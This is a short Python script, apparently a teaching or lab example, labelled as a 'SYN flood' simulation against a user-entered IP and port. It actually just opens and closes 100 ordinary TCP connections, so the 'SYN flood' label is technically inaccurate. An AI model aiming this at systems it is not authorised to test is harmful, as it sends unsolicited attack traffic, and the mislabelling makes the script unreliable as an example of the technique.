import socket
import time

def syn_flood(target, port):
    print(f"[!] Simulating SYN flood on {target}:{port}")

    for i in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target, port))
        except:
            pass
        finally:
            s.close()

    print("[+] Attack simulation complete")

if __name__ == "__main__":
    target = input("Target IP: ")
    port = int(input("Port: "))
    syn_flood(target, port)
